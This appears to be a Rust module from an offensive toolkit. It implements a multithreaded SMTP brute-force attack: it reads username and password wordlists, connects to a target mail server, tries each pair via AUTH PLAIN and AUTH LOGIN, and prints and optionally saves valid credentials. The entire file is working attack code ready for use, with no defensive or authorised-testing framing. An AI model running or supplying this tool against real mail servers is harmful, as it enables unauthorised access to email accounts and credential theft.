use anyhow::{Result, Context};
use regex::Regex;
use std::fs::{File, OpenOptions};
use std::io::{self, BufRead, BufReader, Write};
use std::net::{TcpStream, ToSocketAddrs};
use std::sync::{Arc, Mutex};
use std::time::Duration;
use telnet::{Telnet, Event};
use threadpool::ThreadPool;
use crossbeam_channel::unbounded;

#[derive(Clone)]
struct SmtpBruteforceConfig {
    target: String,
    port: u16,
    username_wordlist: String,
    password_wordlist: String,
    threads: usize,
    stop_on_success: bool,
    verbose: bool,
    full_combo: bool,
}

pub async fn run(target: &str) -> Result<()> {
    println!("\n=== SMTP Bruteforce ===\n");
    let port = prompt("Port (default 25): ").parse().unwrap_or(25);
    let username_wordlist = prompt("Username wordlist file: ");
    let password_wordlist = prompt("Password wordlist file: ");
    let threads = prompt("Threads (default 8): ").parse().unwrap_or(8);
    let stop_on_success = prompt("Stop on first valid login? (y/n): ").trim().eq_ignore_ascii_case("y");
    let full_combo = prompt("Try all combos? (y/n): ").trim().eq_ignore_ascii_case("y");
    let verbose = prompt("Verbose? (y/n): ").trim().eq_ignore_ascii_case("y");
    let config = SmtpBruteforceConfig {
        target: target.to_string(),
        port,
        username_wordlist,
        password_wordlist,
        threads,
        stop_on_success,
        verbose,
        full_combo,
    };
    run_smtp_bruteforce(config)
}

fn run_smtp_bruteforce(config: SmtpBruteforceConfig) -> Result<()> {
    let addr = normalize_target(&config.target, config.port)?;
    let usernames = read_lines(&config.username_wordlist)?;
    let passwords = read_lines(&config.password_wordlist)?;
    if usernames.is_empty() || passwords.is_empty() {
        return Err(anyhow::anyhow!("Empty user or pass wordlist."));
    }
    let found = Arc::new(Mutex::new(Vec::new()));
    let stop_flag = Arc::new(Mutex::new(false));
    let pool = ThreadPool::new(config.threads);
    let (tx, rx) = unbounded();
    if config.full_combo {
        for u in &usernames { for p in &passwords { tx.send((u.clone(), p.clone()))?; } }
    } else if usernames.len() == 1 {
        for p in &passwords { tx.send((usernames[0].clone(), p.clone()))?; }
    } else if passwords.len() == 1 {
        for u in &usernames { tx.send((u.clone(), passwords[0].clone()))?; }
    } else {
        for p in &passwords { tx.send((usernames[0].clone(), p.clone()))?; }
    }
    drop(tx);
    for _ in 0..config.threads {
        let rx = rx.clone();
        let addr = addr.clone();
        let stop_flag = Arc::clone(&stop_flag);
        let found = Arc::clone(&found);
        let config = config.clone();
        pool.execute(move || {
            while let Ok((user, pass)) = rx.recv() {
                if *stop_flag.lock().unwrap() { break; }
                if config.verbose { println!("[*] {}:{}", user, pass); }
                match try_smtp_login(&addr, &user, &pass) {
                    Ok(true) => {
                        println!("[+] VALID: {}:{}", user, pass);
                        let mut creds = found.lock().unwrap(); creds.push((user.clone(), pass.clone()));
                        if config.stop_on_success {
                            *stop_flag.lock().unwrap() = true;
                            while rx.try_recv().is_ok() {}
                            break;
                        }
                    }
                    Ok(false) => {}
                    Err(e) => if config.verbose { eprintln!("[!] {}:{}: {}", user, pass, e); },
                }
            }
        });
    }
    pool.join();
    let found = found.lock().unwrap();
    if found.is_empty() {
        println!("[-] No valid credentials.");
    } else {
        println!("[+] Found:");
        for (u,p) in found.iter() { println!("{}:{}", u, p); }
        if prompt("Save found? (y/n): ").trim().eq_ignore_ascii_case("y") {
            let f = prompt("Filename: ");
            save_results(&f, &found)?;
            println!("[+] Saved to {}", f);
        }
    }
    Ok(())
}

/// Try login with both AUTH PLAIN and AUTH LOGIN, returns Ok(true) if success, Ok(false) if auth fail, Err on connection/protocol error.
fn try_smtp_login(addr: &str, username: &str, password: &str) -> Result<bool> {
    use base64::{engine::general_purpose, Engine as _};
    let socket = addr.to_socket_addrs()?.next().ok_or_else(|| anyhow::anyhow!("Could not resolve address"))?;
    let stream = TcpStream::connect_timeout(&socket, Duration::from_millis(1500)).context("Connect timeout")?;
    stream.set_read_timeout(Some(Duration::from_millis(1500))).ok();
    stream.set_write_timeout(Some(Duration::from_millis(1500))).ok();
    let mut telnet = Telnet::from_stream(Box::new(stream), 256);
    let mut banner_ok = false;
    for _ in 0..3 {
        let event = telnet.read().context("Banner read error")?;
        if let Event::Data(b) = event {
            let s = String::from_utf8_lossy(&b);
            if s.starts_with("220") { banner_ok = true; break; }
        }
    }
    if !banner_ok { return Err(anyhow::anyhow!("No 220 banner")); }
    telnet.write(b"EHLO scanner\r\n")?;
    let mut login_ok = false;
    let mut plain_ok = false;
    let mut ehlo_seen = false;
    let mut buf = String::new();
    for _ in 0..6 {
        let event = telnet.read()?;
        if let Event::Data(b) = event {
            let s = String::from_utf8_lossy(&b);
            buf.push_str(&s);
            if s.contains("AUTH") && s.contains("PLAIN") { plain_ok = true; }
            if s.contains("AUTH") && s.contains("LOGIN") { login_ok = true; }
            if s.starts_with("250 ") { ehlo_seen = true; break; }
        }
    }
    if !ehlo_seen { return Ok(false); }
    // Try AUTH PLAIN
    if plain_ok {
        let mut blob = vec![0];
        blob.extend(username.as_bytes()); blob.push(0); blob.extend(password.as_bytes());
        let cmd = format!("AUTH PLAIN {}\r\n", general_purpose::STANDARD.encode(&blob));
        telnet.write(cmd.as_bytes())?;
        for _ in 0..2 {
            let event = telnet.read()?;
            if let Event::Data(b) = event {
                let s = String::from_utf8_lossy(&b);
                if s.starts_with("235") { telnet.write(b"QUIT\r\n").ok(); return Ok(true); }
                if s.starts_with("535") || s.starts_with("5") { break; }
            }
        }
    }
    // Try AUTH LOGIN
    if login_ok {
        telnet.write(b"AUTH LOGIN\r\n")?;
        let mut expect_user = false;
        for _ in 0..2 {
            let event = telnet.read()?;
            if let Event::Data(b) = event {
                let s = String::from_utf8_lossy(&b);
                if s.starts_with("334") { expect_user = true; break; }
            }
        }
        if !expect_user { return Ok(false); }
        let ucmd = format!("{}\r\n", general_purpose::STANDARD.encode(username.as_bytes()));
        telnet.write(ucmd.as_bytes())?;
        let mut expect_pass = false;
        for _ in 0..2 {
            let event = telnet.read()?;
            if let Event::Data(b) = event {
                let s = String::from_utf8_lossy(&b);
                if s.starts_with("334") { expect_pass = true; break; }
            }
        }
        if !expect_pass { return Ok(false); }
        let pcmd = format!("{}\r\n", general_purpose::STANDARD.encode(password.as_bytes()));
        telnet.write(pcmd.as_bytes())?;
        for _ in 0..2 {
            let event = telnet.read()?;
            if let Event::Data(b) = event {
                let s = String::from_utf8_lossy(&b);
                if s.starts_with("235") { telnet.write(b"QUIT\r\n").ok(); return Ok(true); }
                if s.starts_with("535") || s.starts_with("5") { break; }
            }
        }
    }
    Ok(false)
}

fn read_lines(path: &str) -> Result<Vec<String>> {
    let file = File::open(path).context(format!("Open: {}", path))?;
    Ok(BufReader::new(file).lines().filter_map(Result::ok).filter(|s|!s.trim().is_empty()).collect())
}

fn save_results(path: &str, creds: &[(String, String)]) -> Result<()> {
    let mut file = OpenOptions::new().create(true).write(true).truncate(true).open(path)?;
    for (u,p) in creds { writeln!(file, "{}:{}", u, p)?; }
    Ok(())
}

fn prompt(msg: &str) -> String {
    print!("{}", msg); io::stdout().flush().unwrap(); let mut b = String::new(); io::stdin().read_line(&mut b).unwrap(); b.trim().to_string()
}

fn normalize_target(host: &str, port: u16) -> Result<String> {
    let re = Regex::new(r"^\[*([^\]]+?)\]*(?::(\d{1,5}))?$" ).unwrap();
    let t = host.trim();
    let cap = re.captures(t).ok_or_else(|| anyhow::anyhow!("Invalid target: {}", host))?;
    let addr = cap.get(1).unwrap().as_str();
    let p = cap.get(2).map(|m| m.as_str().parse::<u16>().ok()).flatten().unwrap_or(port);
    let f = if addr.contains(':') && !addr.starts_with('[') { format!("[{}]:{}", addr, p) } else { format!("{}:{}", addr, p) };
    if f.to_socket_addrs()?.next().is_none() { Err(anyhow::anyhow!("DNS fail: {}", f)) } else { Ok(f) }
}
